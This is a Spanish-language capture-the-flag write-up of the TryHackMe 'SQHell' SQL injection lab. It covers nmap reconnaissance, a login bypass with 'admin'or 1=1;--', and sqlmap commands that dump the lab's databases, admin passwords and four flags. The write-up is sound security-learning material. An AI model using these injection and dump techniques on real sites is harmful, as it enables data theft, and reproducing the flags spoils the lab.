---
Titulo: SQHell
Fecha: 28-07-2025
categoria: SQLi
Dificultad_oficial: Media
Dificultad_percibida: Media/Dificil
Estado: Terminado
---
## 1. Descripción del reto
Seguramente tendré una pagina web vulnerable a SQLI.

## 2. Enumeración / Reconocimiento
Vamos a comenzar con escaneo de puerto con la herramienta "nmap".
```shell
root@ip-10-10-4-119:~# nmap -sS -sV -sC -Pn 10.10.231.166
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-28 12:06 BST
Nmap scan report for ip-10-10-231-166.eu-west-1.compute.internal (10.10.231.166)
Host is up (0.00025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
MAC Address: 02:3B:99:CD:48:E1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
```

Observo que hay dos puertos abiertos, el 22 y el 80 (SSH y HTTP respectivamente). Primero que nada voy a ver que nos podemos encontrar en la página web, ya que al no tener ninguna credencial para el ssh no tiene sentido hacer nada con el de momento.

![[Pasted image 20250728120847.png]]

Al entrar en la página, primero que nada me fijo que en la esquina superior derecha hay dos botones, uno de `login` y otro de `register`, por lo que son lo que más me llama la atención. Después con una inspección más detallada veo que los "post" que hay, especifican por quien ha sido escrito, por lo que ya tengo un potencial nombre de usuario. Voy a realizar una investigaciones más, primero que nada voy a ver el código fuente de la pagina en busca de pistas o detalles que me puedan ayudar, además voy a ver si en la consola aparece alguna información relevante, por último, voy a utilizar herramientas como `dirsearch` o `gobuster` para buscar directorios ocultos que no aparezcan. Una vez verificado que todo esto este en orden, voy a proceder a seguir los link's en pantalla.

```html
<div class="panel-heading">Second Post : by <a href="/user?id=1">admin</a></div>
```

Revisando el código fuente de la página me percate que lo que seria el link a la palabra `admin` tiene de forma indirecta adjunto un id, en este caso es 1, por lo que ya tenemos más información, voy a continuar con la consola, en caso de que no haya nada voy a proceder las herramientas que he comentado anteriormente.

```shell
root@ip-10-10-4-119:~# dirsearch -u http://10.10.231.166/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /root/reports/http_10.10.231.166/__25-07-28_12-20-50.txt

Target: http://10.10.231.166/

[12:20:50] Starting: 
[12:21:15] 200 -    2KB - /login
[12:21:15] 200 -    2KB - /login/
[12:21:22] 200 -   21B  - /post
[12:21:23] 200 -    3KB - /register
[12:21:31] 200 -   21B  - /user
[12:21:31] 200 -   21B  - /user/

Task Completed
```

Como en ningún apartado de inspeccionar no observe nada raro, procedí con las herramientas comentadas, con la primera encontré directorios que se esperaban como `login` o `register`, pero veo que hay dos que me podrían servir en un futuro como `post` y `user`. Ahora voy a continuar con la herramienta gobuster haber si consigo encontrar algo más a fondo.

Veo que con gobuster solo encuentra lo mismo que con dirsearch, por lo que llevado por la curiosidad decido entrar primero en el apartado `post`, la página me dijo que necesitaba un `id` por lo que recordando lo que encontramos en el código fuente decido poner al final de la url `?id=1` por lo que únicamente me mostro el primer post y de ahí probé hasta el 4º post donde solo el 2 me dio respuesta. De ahí deduje que el apartado `user` me iba a dar información del usuario. Ya doy por terminado el análisis y voy a entrar en el apartado login haber si puedo extraer algo de información del usuario `admin`.

## 3. Explotación / Desarrollo

### Flag 1 - Inyección clasica

![[Pasted image 20250728123515.png]]

Ya que la máquina es de SQLi en primer lugar decido poner en el apartado `username` la inyección `admin'or 1=1;--` con una contraseña cualquiera, y esto me da la primera flag. Voy a ver si puedo extraer más información de aquí.

Después de un buen rato de estar probando múltiples cosas, con la herramienta `sqlmap` conseguí varias cosas, la primera era identificar que la base de datos de fondo es `MYSQL`, por lo que dado eso le digo a `sqlmap` que me liste todas las bases de datos que encuentre. dándome el siguiente resultado:
```shell
root@ip-10-10-4-119:~# sqlmap http://10.10.231.166/user?id=1 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:28:14 /2025-07-28/

[13:28:14] [INFO] resuming back-end DBMS 'mysql' 
[...]
[13:28:14] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[13:28:14] [INFO] fetching database names
[13:28:14] [INFO] retrieved: 'information_schema'
[13:28:14] [INFO] retrieved: 'sqhell_4'
available databases [2]:                                                                                           
[*] information_schema
[*] sqhell_4

[13:28:14] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.231.166'

[*] ending @ 13:28:14 /2025-07-28/
```

Viendo que la base de datos que parece que quiero atacar es `sqhell_4`, voy a ver que más información puedo sacar de aquí, resumiré la información encontrada.

```shell
root@ip-10-10-4-119:~# sqlmap http://10.10.231.166/user?id=1 -D sqhell_4 -T users -C id,username,password --dump

+------+------------+----------+
| id   | password   | username |
+------+------------+----------+
| 1    | password   | admin    |
+------+------------+----------+

[*] ending @ 13:37:24 /2025-07-28/
```

Ya no encuentro más información aquí, voy a ver si con el apartado `post` hay más suerte.

>[!info] No encontré nada en post, pero me resulto curioso que no tuviera una tabla "común" puede que esto lo investigue más adelante. Ya que observo que las bases de datos hay hasta ¿4? pero no he encontrado la 1, mirare haber que puedo hacer.

```shell
root@ip-10-10-4-119:~# sqlmap -r /root/Prueba2 --dbms=Mysql -D sqhell_2 --dump-all
+------+----------+---------------------------------+
| id   | username | password                        |
+------+----------+---------------------------------+
| 1    | admin    | icantrememberthispasswordcanyou |
+------+----------+---------------------------------+
[*] ending @ 13:58:08 /2025-07-28/
```

El archivo del parámetro `-r` es un captura de una petición post en el directorio `login`, en especifico es la siguiente:

```http
POST /login HTTP/1.1
Host: 10.10.126.16
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.126.16/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.10.126.16
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin*&password=
```

Ahora voy a ir al apartado de términos y condiciones, que es lo que me dice la pista de la segunda bandera.

### Flag 2 - Cabecera HTTP

![[Pasted image 20250728141149.png]]

Veo que la ultima consigna hay un apartado donde guardan mi IP, ya que estoy con encabezados http, hice una búsqueda rápida en internet y vi que hay un encabezado denominado `X-Forwarded-For` a si que lo voy a poner en el encabezado y se lo voy a volver a mandar a `sqlmap` haber si saca algo. 

```shell
root@ip-10-10-86-187:~# sqlmap -r Prueba3 --dbms=MySQL -D sqhell_1 --dump-all
Table: flag
[1 entry]
+------+---------------------------------------------+
| id   | flag                                        |
+------+---------------------------------------------+
| 1    | THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
+------+---------------------------------------------+
Table: hits
[0 entries]
+----+------+---------+
| ip | id   | count   |
+----+------+---------+
+----+------+---------+
[*] ending @ 14:28:45 /2025-07-28/
```

Sacamos la segunda flag ahora a por la tercera, veo que lo de darle los encabezados a sqlmap funciona, por lo que voy a ver si con el apartado de `register` funciona algo.

### Flag 3 

![[Pasted image 20250728143813.png]]

Veo que me lo bloquean por algún motivo, por lo que voy a investigar el código fuente en buscar de algo.

```javascript
$.getJSON('/register/user-check?username='+ username,function(resp){
```

aquí veo una url, voy a ver si consigo algo con ella.

![[Pasted image 20250728144116.png]]

Con esto tenemos premio ! ahora voy a coger esta petición le pongo el `*` para que sqlmap sepa de donde tirar y haber si sacamos otra flag.

```shell
root@ip-10-10-86-187:~# sqlmap -r Prueba4 --dbms=MySQL -D sqhell_3 --dump-all
Table: users
[1 entry]
+------+----------+---------------------------------+
| id   | username | password                        |
+------+----------+---------------------------------+
| 1    | admin    | icantrememberthispasswordcanyou |
+------+----------+---------------------------------+
Table: flag
[1 entry]
+------+---------------------------------------------+
| id   | flag                                        |
+------+---------------------------------------------+
| 1    | THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308} |
+------+---------------------------------------------+
[*] ending @ 14:46:06 /2025-07-28/
```

Vámonos ! ya tenemos otra flag, ahora solo faltan dos y me da que los apartados de `post` y `user`, nos van a servir bastante. Vamos a ver que hacemos.

### Flag 4 - Inyección "union select" avanzada

![[Pasted image 20250728161227.png]]

He necesitado ayuda de un walktrough, ya que no sabia como continuar [link][(https://medium.com/@hellhandy/tryhackme-sqhell-75fafb9f6795)]. Y a decir verdad no lo he llegado a entender. Pero bueno no hay que desanimarse, vamos a por el apartado de post haber si no es tan dificil.

### Flag 5 - 
```shell
root@ip-10-10-253-204:~# sqlmap -u "http://10.10.253.229/post?id=1" --dbms=MySQL -D sqhell_5 --dump-all --batch
Table: users
[1 entry]
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
| 1    | admin    | password   |
+------+----------+------------+

Table: flag
[1 entry]
+------+---------------------------------------------+
| id   | flag                                        |
+------+---------------------------------------------+
| 1    | THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} |
+------+---------------------------------------------+
[*] ending @ 16:17:28 /2025-07-28/
```

Por dios no he tardado ni dos minutos 😅🤣 debería de haber empezado por aquí antes.

## 6. Notas y aprendizajes

- Punto fuerte: Te da una muy buena base para hacer SQLi
    
- Dificultad encontrada: 
	- No saber utilizar bien sqlmap y no darme cuenta de que puedo usar burpsuite para extraer peticiones que después puedo utilizar en sqlmap
	- La dificultad de la flag 4 destaca la importancia de documentarse y apoyarse en recursos cuando uno se queda atascado.
- Conceptos nuevos aprendidos: Utilización de sqlmap y burpsuite de una forma diferente.